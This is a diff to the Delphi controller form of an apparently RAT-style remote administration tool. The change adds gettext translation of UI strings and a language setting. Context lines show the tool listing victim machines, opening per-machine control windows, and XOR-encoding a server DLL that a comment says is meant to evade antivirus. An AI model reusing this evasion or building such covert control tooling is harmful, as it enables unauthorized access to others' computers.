@@ -24,7 +24,7 @@ uses
   IdAntiFreeze, IdBaseComponent, IdComponent, IdTCPServer,
   UnitFormControl,
   UnitVariables,
-  UnitFormNotifica, AppEvnts;
+  UnitFormNotifica, AppEvnts, gnugettext;
 
 const
   WM_POP_MESSAGE = WM_USER + 1;  //Mensaje usado para las notificaciones
@@ -133,9 +133,11 @@ type
     procedure TrayMessage(var Msg: TMessage); message WM_ICONTRAY;
     procedure NotiMsnDesconect(tItem: TListItem);
   public
+    Idioma : string; //El idioma actual
     Columnas : array[0..8] of string; //Para saber el orden de las columnas
     NotificandoOnline: Boolean; //Si estamos notificando alguna conexión
     ControlWidth, ControlHeight : integer; //Anchura y altura de FormControl para guardar al archivo ini
+    procedure Traducir();
     procedure FormCloseQuery(Sender: TObject; var CanClose: boolean);
     procedure FormCloseQueryMinimizarAlTray(Sender: TObject; var CanClose: boolean);
     procedure MinimizeToTrayClick(Sender: TObject);
@@ -150,7 +152,8 @@ var
 implementation
 
 uses UnitOpciones, UnitAbout, UnitID, UnitFormConfigServer,
-  UnitColumnasManager;
+  UnitColumnasManager, UnitFormLanguage, UnitFormReg, UnitFormSendKeys,
+  ScreenMaxCap, UnitVisorDeMiniaturas;
 
 {$R *.dfm}
 
@@ -204,17 +207,17 @@ var
   List: TList;
   Athread: TidPeerThread;
 begin
-  if BtnEscuchar.Caption = 'Escuchar' then
+  if BtnEscuchar.Caption = _('Escuchar') then
   begin
     try
       ServerSocket.DefaultPort := StrToIntdef(FormOpciones.EditPuerto.Text,80);
       ServerSocket.Active := True;
       FormOpciones.EditPuerto.Enabled := False;
-      BtnEscuchar.Caption := 'Detener';
+      BtnEscuchar.Caption := _('Detener');
       Escuchar1.Checked := True;
     except
-      MessageDlg('El puerto ' + FormOpciones.EditPuerto.Text +
-        ' ya está en uso o hay un firewall bloqueándolo, elija otro', mtWarning, [mbOK], 0);
+      MessageDlg(_('El puerto ') + FormOpciones.EditPuerto.Text +
+        _(' ya está en uso o hay un firewall bloqueándolo, elija otro'), mtWarning, [mbOK], 0);
     end;
     try
       h := TBitmap.Create;
@@ -222,13 +225,13 @@ begin
       BtnEscuchar.Glyph := h;
 
     except
-      MessageDlg('No se puede cargar la imagen: ' + ExtractFilePath(ParamStr(0)) +
+      MessageDlg(_('No se puede cargar la imagen: ') + ExtractFilePath(ParamStr(0)) +
         'Recursos\Imagenes\detener.bmp', mtWarning, [mbOK], 0);
     end;
     h.Free;
 
-    StatusBar.Panels[0].Text := 'Esperando conexiones';
-    StatusBar.Panels[1].Text := 'Puerto: ' + FormOpciones.EditPuerto.Text;
+    StatusBar.Panels[0].Text := _('Esperando conexiones');
+    StatusBar.Panels[1].Text := _('Puerto: ') + FormOpciones.EditPuerto.Text;
   end
   else
   begin
@@ -252,18 +255,18 @@ begin
     ServerSocket.Bindings.Clear;
     ListViewConexiones.Clear;
     FormOpciones.EditPuerto.Enabled := True;
-    BtnEscuchar.Caption := 'Escuchar';
+    BtnEscuchar.Caption := _('Escuchar');
     Escuchar1.Checked   := False;
     try
       h := TBitmap.Create;
       h.LoadFromFile(ExtractFilePath(ParamStr(0)) + 'Recursos\Imagenes\escuchar.bmp');
       BtnEscuchar.Glyph := h;
     except
-      MessageDlg('No se puede cargar la imagen: ' + ExtractFilePath(ParamStr(0)) +
+      MessageDlg(_('No se puede cargar la imagen: ') + ExtractFilePath(ParamStr(0)) +
         'Recursos\Imagenes\escuchar.bmp', mtWarning, [mbOK], 0);
     end;
     h.Free;
-    StatusBar.Panels[0].Text := 'Escucha detenida';
+    StatusBar.Panels[0].Text := _('Escucha detenida');
   end;
 end;
 //Fin de los eventos de los botones del Formulario
@@ -318,7 +321,7 @@ begin
     ServerSocket.Threads.UnlockList();
   end;
 
-  StatusBar.Panels[0].Text := 'Numero de conexiones: '+inttostr(Listviewconexiones.Items.count);
+  StatusBar.Panels[0].Text := _('Numero de conexiones: ')+inttostr(Listviewconexiones.Items.count);
 end;
 
 function TFormMain.buscaridcolumnapornombre(nombre:string):integer; //devuelve el id de una columna conociendo su caption
@@ -362,7 +365,7 @@ begin
   //Globo emergente de intento de conexión ??
     TmpServDLL := ServDll;
     if NotificacionMsn then //solo si está activa la notificación MSN de lo contrario podría molestar
-      GloboEmergente('Pidiendo Servidor', 'Pidiendo Servidor', NIIF_INFO);
+      GloboEmergente(_('Pidiendo Servidor'), _('Pidiendo Servidor'), NIIF_INFO);
     for i := 1 to length(ServDLL) do  //con la primera clave
       TmpServDLL[i] := chr(ord(TmpServDLL[i]) xor strtoint(Copy(Recibido, 1, Pos('|', Recibido) - 1)));//funcion de cifrado simple para evadir antiviruses
     Delete(Recibido, 1, Pos('|', Recibido));
@@ -479,7 +482,7 @@ begin
       end;
   end;
 
-   StatusBar.Panels[0].Text := 'Numero de conexiones: '+inttostr(Listviewconexiones.Items.count);
+   StatusBar.Panels[0].Text := _('Numero de conexiones: ')+inttostr(Listviewconexiones.Items.count);
 end;
 //Fin de eventos del ServerSocket
 
@@ -520,7 +523,7 @@ begin
     if(buscaridcolumnapornombre(Columnas[1]) <> -1) then
     begin
       NuevaVentanaControl.Caption :=
-      'Centro de control: ' + ListViewConexiones.Selected.SubItems[buscaridcolumnapornombre(columnas[1])] +
+      _('Centro de control: ') + ListViewConexiones.Selected.SubItems[buscaridcolumnapornombre(columnas[1])] +
       ' ' + Athread.Connection.Socket.Binding.PeerIP;
       NuevaVentanaControl.NombrePC := ListViewConexiones.Selected.SubItems[buscaridcolumnapornombre(columnas[1])];
     end;
@@ -660,15 +663,15 @@ begin
     end;
 
     Listviewconexiones.columns.Clear;
-    Columnas[0] :=Ini.ReadString('AparienciaCliente', 'ColumnaNombre0', 'IP');
-    Columnas[1] :=Ini.ReadString('AparienciaCliente', 'ColumnaNombre1', 'Nombre');
-    Columnas[2] :=Ini.ReadString('AparienciaCliente', 'ColumnaNombre2', 'CPU');
-    Columnas[3] :=Ini.ReadString('AparienciaCliente', 'ColumnaNombre3', 'SO');
-    Columnas[4] :=Ini.ReadString('AparienciaCliente', 'ColumnaNombre4', 'Versión');
-    Columnas[5] :=Ini.ReadString('AparienciaCliente', 'ColumnaNombre5', 'Ping');
-    Columnas[6] :=Ini.ReadString('AparienciaCliente', 'ColumnaNombre6', 'Ventana activa');
-    Columnas[7] :=Ini.ReadString('AparienciaCliente', 'ColumnaNombre7', 'TSU');
-    Columnas[8] :=Ini.ReadString('AparienciaCliente', 'ColumnaNombre8', 'Encendido hace');
+    Columnas[0] :=Ini.ReadString('AparienciaCliente', 'ColumnaNombre0', _('IP'));
+    Columnas[1] :=Ini.ReadString('AparienciaCliente', 'ColumnaNombre1', _('Nombre'));
+    Columnas[2] :=Ini.ReadString('AparienciaCliente', 'ColumnaNombre2', _('CPU'));
+    Columnas[3] :=Ini.ReadString('AparienciaCliente', 'ColumnaNombre3', _('SO'));
+    Columnas[4] :=Ini.ReadString('AparienciaCliente', 'ColumnaNombre4', _('Versión'));
+    Columnas[5] :=Ini.ReadString('AparienciaCliente', 'ColumnaNombre5', _('Ping'));
+    Columnas[6] :=Ini.ReadString('AparienciaCliente', 'ColumnaNombre6', _('Ventana activa'));
+    Columnas[7] :=Ini.ReadString('AparienciaCliente', 'ColumnaNombre7', _('TSU'));
+    Columnas[8] :=Ini.ReadString('AparienciaCliente', 'ColumnaNombre8', _('Encendido hace'));
 
     for i:=0 to 8 do
     begin
@@ -679,10 +682,14 @@ begin
           c.width := Ini.ReadInteger('AparienciaCliente', 'Columna'+inttostr(i)+'Width',100);
        end;
     end;
+
     self.Width := Ini.ReadInteger('AparienciaCliente', 'FormMainWidth',self.Width);
     self.Height := Ini.ReadInteger('AparienciaCliente', 'FormMainHeight',self.Height);
     ControlWidth := Ini.ReadInteger('AparienciaCliente', 'FormControlWidth',ControlWidth);
     ControlHeight := Ini.ReadInteger('AparienciaCliente', 'FormControlHeight',ControlHeight);
+    self.Idioma := Ini.ReadString('Idioma', 'Idioma', 'NONE');
+    if self.Idioma = 'NONE' then
+      FormSeleccionarIdioma.ShowModal;
   finally
     Ini.Free;
   end;
@@ -774,6 +781,7 @@ begin
     Ini.WriteInteger('AparienciaCliente', 'FormMainWidth',self.Width);
     Ini.WriteInteger('AparienciaCliente', 'FormControlHeight',ControlHeight);
     Ini.WriteInteger('AparienciaCliente', 'FormControlWidth',ControlWidth);
+    Ini.WriteString ('Idioma', 'Idioma',self.idioma);
   finally
     Ini.Free;
   end;
@@ -786,6 +794,8 @@ var
   Tamano                 : integer;
   i                      : integer;
 begin
+  
+ 
   Application.OnMinimize := MinimizeToTrayClick;
 
   //Inicializar el icono de la TrayBar
@@ -816,7 +826,7 @@ begin
 
   end
   else
-    MessageDlg('CoolServer.dll no existe, no se podrán mandar servidores', mtWarning, [mbOK], 0);
+    MessageDlg(_('CoolServer.dll no existe, no se podrán mandar servidores'), mtWarning, [mbOK], 0);
 
 
 end;
@@ -847,13 +857,26 @@ begin
   GloboEmergente(Titulo,Mensaje,NIIF_ERROR);
 end;
 
+procedure TFormMain.Traducir();
+begin
+ //Cargamos los archivos de idioma
+    UseLanguage(Formmain.idioma);
+    TranslateComponent(self);
+    TranslateComponent(FormAbout);
+    TranslateComponent(FormColumnasManager);
+    TranslateComponent(FormConfigServer);
+    TranslateComponent(FormID);
+    TranslateComponent(FormOpciones);
+end;
+
 procedure TFormMain.FormShow(Sender: TObject);
 begin
   
   if PrimeraVezQueMeMuestro then
   begin
-    StatusBar.Panels[0].Text := 'Estado: No escuchando';
+    StatusBar.Panels[0].Text := _('Estado: No escuchando');
     LeerArchivoINI();
+    Traducir();
     PrimeraVezQueMeMuestro := False;
     if FormOpciones.CheckBoxEscucharAlIniciar.Checked then
       BtnEscuchar.Click;
